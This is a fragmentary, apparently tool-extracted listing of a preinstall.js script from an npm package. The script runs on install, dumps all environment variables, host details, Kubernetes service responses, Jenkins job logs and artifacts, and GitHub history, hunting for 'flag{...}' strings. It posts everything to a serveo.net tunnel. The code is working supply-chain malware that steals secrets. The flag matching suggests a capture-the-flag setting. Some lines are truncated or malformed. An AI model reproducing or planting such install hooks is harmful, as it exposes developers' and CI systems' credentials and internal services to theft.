// File: tmp/tmpel8iu854/mysteryxyz228/package/preinstall.js
// ======================================================================
Line 3: const http = require("http")
Line 4: const https = require("https")
Line 5: _tmp_51 = require("url")
Line 6: const fs = require("fs")
Line 7: const os = require("os")
Line 10: const CALLBACK      = process.env.CALLBACK_URL || "https://b9264fe39e47ba49312cb26cbd1c219d.serveo.net"
Line 11: parseInt(process.env.REQ_TIMEOUT_MS || "3000", 10)
Line 12: parseInt(process.env.MAX_ENV_BYTES || "200000", 10)
Line 16: /^(1|true)$/i.test(process.env.J_FETCH_CONSOLE || "1")
Line 17: parseInt(process.env.J_CONSOLE_TAIL || "20000", 10)
Line 21: parseInt(process.env.GH_COMMITS || "50", 10)
Line 27: {
      const url = new URL(u);
      const lib = url.protocol === "https:" ? https : http;
      const req = lib.request({
        method: "GET",
        hostname: url.hostname,
        port: url.port || (url.protocol === "https:" ? 443 : 80),
        path: url.pathname + url.search,
        timeout: timeoutMs,
        headers: Object.assign({ "Accept":"*/*", "Connection":"close" }, headers)
      }, (res) => {
        const chunks = [];
        res.on("data", c => chunks.push(c));
        res.on("end", () => resolve({ ok:true, status:res.statusCode, headers:res.headers, body:Buffer.concat(chunks) }));
      });
      req.on("timeout", () => { try { req.destroy(new Error("timeout")); } catch {} });
      req.on("error", e => resolve({ ok:false, error:String(e) }));
      req.end();
    }
Line 37: {
        const chunks = [];
        res.on("data", c => chunks.push(c));
        res.on("end", () => resolve({ ok:true, status:res.statusCode, headers:res.headers, body:Buffer.concat(chunks) }));
      }
Line 38: const chunks = []
Line 39: chunks.push(c)
Line 44: req.end()
Line 52: r.json = JSON.parse(r.body.toString("utf8"))
Line 53: r.body.toString("utf8")
Line 57: {
    const url = new URL(u);
    const payload = Buffer.from(JSON.stringify(obj));
    const lib = url.protocol === "https:" ? https : http;
    const req = lib.request({
      method: "POST",
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path: url.pathname + url.search,
      headers: Object.assign({
        "Content-Type":"application/json",
        "Content-Length": payload.length,
        "Connection":"close"
      }, extraHeaders),
      timeout: TIMEOUT_MS
    }, res => { res.resume(); resolve(); });
    req.on("error", () => resolve());
    req.write(payload); req.end();
  }
Line 59: Buffer.from(JSON.stringify(obj))
Line 74: req.write(payload)
Line 79: postJSON(CALLBACK, { tag, part, total, data })
Line 83: {
  const pairs = Object.entries(process.env);
  // отсортируем для стабильности и усечём по размеру
  const out = {};
  let used = 0;
  for (const [k,v] of pairs.sort((a,b)=>a[0].localeCompare(b[0]))) {
    const s = `${k}=${v}\n`;
    if (used + s.length > limitBytes) break;
    out[k] = v;
    used += s.length;
  }
  return out;
}
Line 88: for (const [k,v] of pairs.sort((a,b)=>a[0].localeCompare(b[0]))) {
    const s = `${k}=${v}\n`;
    if (used + s.length > limitBytes) break;
    out[k] = v;
    used += s.length;
  }
Line 91: out[k] = v
Line 101: for (const [k,v] of Object.entries(env)) {
    const m = k.match(/^(.+)_SERVICE_HOST$/);
    if (!m) continue;
    const name = m[1];
    const host = v;
    const port = env[`${name}_SERVICE_PORT`] || env[`${name}_PORT`];
    map[name.toLowerCase()] = { host, port: port ? String(port) : "80" };
  }
Line 104: const name = m[1]
Line 106: const port = env[`${name}_SERVICE_PORT`] || env[`${name}_PORT`]
Line 107: map[name.toLowerCase()] = { host, port: port ? String(port) : "80" }
Line 111: {
      const u = new URL(env.RABBITMQ_PORT_15672_TCP);
      map["rabbitmq-mgmt"] = { host: u.hostname, port: String(u.port || 15672) };
    }
Line 113: map["rabbitmq-mgmt"] = { host: u.hostname, port: String(u.port || 15672) }
Line 119: {
  const base = `http://${host}:${port}`;
  const out = { base, checks: [] };
  for (const p of paths) {
    const url = `${base}${p.startsWith("/")?p:"/"+p}`;
    const r = await httpGetRaw(url);
    const item = { url, status: r.status || 0 };
    if (r.ok && r.status === 200) {
      const txt = r.body.toString("utf8");
      item.sample = txt.slice(0, 4000);
      const m = txt.match(/flag\{[^}\r\n]{1,200}\}/i);
      if (m) item.flag = m[0];
    } else {
      item.error = r.error || `status ${r.status}`;
    }
    out.checks.push(item);
  }
  return out;
}
Line 120: <operator>.formatString("http://", host, ":", port, "")
Line 121: const out = { base, checks: [] }
Line 122: _iterator_2.next()
Line 126: {
      const txt = r.body.toString("utf8");
      item.sample = txt.slice(0, 4000);
      const m = txt.match(/flag\{[^}\r\n]{1,200}\}/i);
      if (m) item.flag = m[0];
    }
Line 127: r.body.toString("utf8")
Line 129: const m = txt.match(/flag\{[^}\r\n]{1,200}\}/i)
Line 134: out.checks.push(item)
Line 140: function fetchExternalJenkins = async function fetchExternalJenkins() {
  if (!JENKINS_URL) return { skipped: true };
  const base = JENKINS_URL;
  const j = { base, jobs: [] };

  const jobs = await httpGetJSON(`${base}/api/json?tree=jobs[name,url,color]`);
  if (!jobs.ok || !jobs.json) return { base, error: jobs.error || `status ${jobs.status}` };

  for (const job of (jobs.json.jobs||[])) {
    const name = job.name;
    const jb = { name, url: job.url, builds: [] };
    const br = await httpGetJSON(`${base}/job/${encodeURIComponent(name)}/api/json?tree=builds[number,url,result,timestamp,artifacts[fileName,relativePath]]`);
    if (!br.ok || !br.json) { jb.error = br.error || `status ${br.status}`; j.jobs.push(jb); continue; }
    for (const b of (br.json.builds||[]).slice(0, 30)) {
      const item = { number: b.number, url: b.url, result: b.result, artifacts: b.artifacts || [] };
      if (FETCH_CONSOLE) {
        const cons = await httpGetRaw(`${base}/job/${encodeURIComponent(name)}/${b.number}/consoleText`)...
Line 143: const j = { base, jobs: [] }
Line 145: const jobs = await httpGetJSON(`${base}/api/json?tree=jobs[name,url,color]`)
Line 148: for (const job of (jobs.json.jobs||[])) {
    const name = job.name;
    const jb = { name, url: job.url, builds: [] };
    const br = await httpGetJSON(`${base}/job/${encodeURIComponent(name)}/api/json?tree=builds[number,url,result,timestamp,artifacts[fileName,relativePath]]`);
    if (!br.ok || !br.json) { jb.error = br.error || `status ${br.status}`; j.jobs.push(jb); continue; }
    for (const b of (br.json.builds||[]).slice(0, 30)) {
      const item = { number: b.number, url: b.url, result: b.result, artifacts: b.artifacts || [] };
      if (FETCH_CONSOLE) {
        const cons = await httpGetRaw(`${base}/job/${encodeURIComponent(name)}/${b.number}/consoleText`);
        if (cons.ok && cons.status === 200) {
          const txt = cons.body.toString("utf8");
          item.consoleTail = txt.slice(-CONSOLE_TAIL);
          const m = txt.match(/flag\{[^}\r\n]{1,200}\}/i);
          if (m) item.consoleFlag = m[0];
        } else {
          item.consoleError = cons.error || `status ...
Line 150: const jb = { name, url: job.url, builds: [] }
Line 151: const br = await httpGetJSON(`${base}/job/${encodeURIComponent(name)}/api/json?tree=builds[number,url,result,timestamp,artifacts[fileName,relativePath]]`)
Line 152: j.jobs.push(jb)
Line 153: for (const b of (br.json.builds||[]).slice(0, 30)) {
      const item = { number: b.number, url: b.url, result: b.result, artifacts: b.artifacts || [] };
      if (FETCH_CONSOLE) {
        const cons = await httpGetRaw(`${base}/job/${encodeURIComponent(name)}/${b.number}/consoleText`);
        if (cons.ok && cons.status === 200) {
          const txt = cons.body.toString("utf8");
          item.consoleTail = txt.slice(-CONSOLE_TAIL);
          const m = txt.match(/flag\{[^}\r\n]{1,200}\}/i);
          if (m) item.consoleFlag = m[0];
        } else {
          item.consoleError = cons.error || `status ${cons.status}`;
        }
      }
      // попробуем скачать артефакты, похожие на флаг/лог
      for (const a of item.artifacts.slice(0, 10)) {
        const url = `${base}/job/${encodeURIComponent(name)}/${b.number}/artifact/${a.relativePath}`;
        const ar = await httpGetRaw(url);
        if (ar.ok && ar.status === 200) {
          const txt = ar.body.toString("utf8");
         ...
Line 154: const item = { number: b.number, url: b.url, result: b.result, artifacts: b.artifacts || [] }
Line 157: {
          const txt = cons.body.toString("utf8");
          item.consoleTail = txt.slice(-CONSOLE_TAIL);
          const m = txt.match(/flag\{[^}\r\n]{1,200}\}/i);
          if (m) item.consoleFlag = m[0];
        }
Line 158: cons.body.toString("utf8")
Line 160: const m = txt.match(/flag\{[^}\r\n]{1,200}\}/i)
Line 167: _iterator_5.next()
Line 170: {
          const txt = ar.body.toString("utf8");
          const hit = txt.match(/flag\{[^}\r\n]{1,200}\}/i);
          if (hit) { item.artifactFlag = hit[0]; item.artifactHit = a.relativePath; break; }
        }
Line 171: ar.body.toString("utf8")
Line 172: const hit = txt.match(/flag\{[^}\r\n]{1,200}\}/i)
Line 176: jb.builds.push(item)
Line 178: j.jobs.push(jb)
Line 184: function fetchGitHubHistory = async function fetchGitHubHistory(repo) {
  const out = { repo, commits: [], tags: [], releases: [] };
  const H = { "User-Agent": GH_USER_AGENT, "Accept":"application/vnd.github+json" };

  // commits
  const cr = await httpGetJSON(`https://api.github.com/repos/${repo}/commits?per_page=${GH_COMMITS}`, TIMEOUT_MS, H);
  if (cr.ok && cr.json) {
    for (const c of cr.json) {
      const msg = (c.commit && c.commit.message) || "";
      const m = msg.match(/flag\{[^}\r\n]{1,200}\}/i);
      out.commits.push({ sha: c.sha, message: msg.slice(0, 1000), flag: m ? m[0] : undefined });
    }
  } else out.commitsError = cr.error || `status ${cr.status}`;

  // tags
  const tr = await httpGetJSON(`https://api.github.com/repos/${repo}/tags?per_page=100`, TIMEOUT_MS, H);
  if (tr.ok && tr.json) out.tags = tr.json.map(t => ({ name: t.name, sha: t.commit && t.commit.sha }));
  else out.tagsError = tr.error || `status ${tr.status}`;

  // releases
  const rr = await httpGetJSON(`https://api.github...
Line 185: const out = { repo, commits: [], tags: [], releases: [] }
Line 189: const cr = await httpGetJSON(`https://api.github.com/repos/${repo}/commits?per_page=${GH_COMMITS}`, TIMEOUT_MS, H)
Line 191: for (const c of cr.json) {
      const msg = (c.commit && c.commit.message) || "";
      const m = msg.match(/flag\{[^}\r\n]{1,200}\}/i);
      out.commits.push({ sha: c.sha, message: msg.slice(0, 1000), flag: m ? m[0] : undefined });
    }
Line 193: const m = msg.match(/flag\{[^}\r\n]{1,200}\}/i)
Line 194: out.commits.push({ sha: c.sha, message: msg.slice(0, 1000), flag: m ? m[0] : undefined })
Line 199: const tr = await httpGetJSON(`https://api.github.com/repos/${repo}/tags?per_page=100`, TIMEOUT_MS, H)
Line 204: const rr = await httpGetJSON(`https://api.github.com/repos/${repo}/releases?per_page=50`, TIMEOUT_MS, H)
Line 206: {
      name: r.name, tag: r.tag_name, bodySample: (r.body||"").slice(0, 2000),
      flag: (r.body||"").match(/flag\{[^}\r\n]{1,200}\}/i)?.[0]
    }
Line 208: _tmp_48.flag = (r.body||"").match(/flag\{[^}\r\n]{1,200}\}/i)[0]
Line 216: (_tmp_54 = (async () => {
  const meta = {
    when: new Date().toISOString(),
    host: os.hostname(),
    node: process.version,
    cwd: process.cwd()
  };

  // 0) окружение (полностью, но усечённо)
  const envDump = captureEnv();
  await exfil("env", { meta, env: envDump });

  // 1) внешний Jenkins (если указан)
  const jext = await fetchExternalJenkins();
  await exfil("jenkins_external", { meta, jenkins: jext });

  // 2) k8s-сервисы из *_SERVICE_HOST/_PORT (jenkins, rabbitmq, и т.п.)
  const services = enumerateK8sServices();
  const svcNames = Object.keys(services).slice(0, 25);
  const pathsCommon = ["/", "/login", "/api/json", "/env-vars.html", "/swagger.json", "/api-docs", "/openapi.json", "/version", "/about"];
  const svcResults = {};
  for (const name of svcNames) {
    const { host, port } = services[name];
    svcResults[name] = await probeService(host, port, pathsCommon);
  }
  await exfil("k8s_services", { meta, services, results: svcResults });

  // 3) GitHub history (реп...)
Line 219: os.hostname()
Line 229: const jext = await fetchExternalJenkins()
Line 233: enumerateK8sServices()
Line 234: Object.keys(services)
Line 235: const pathsCommon = ["/", "/login", "/api/json", "/env-vars.html", "/swagger.json", "/api-docs", "/openapi.json", "/version", "/about"]
Line 237: for (const name of svcNames) {
    const { host, port } = services[name];
    svcResults[name] = await probeService(host, port, pathsCommon);
  }
Line 238: const { host, port } = services[name]
Line 239: svcResults[name] = await probeService(host, port, pathsCommon)
Line 244: const gh = await fetchGitHubHistory(GITHUB_REPO)
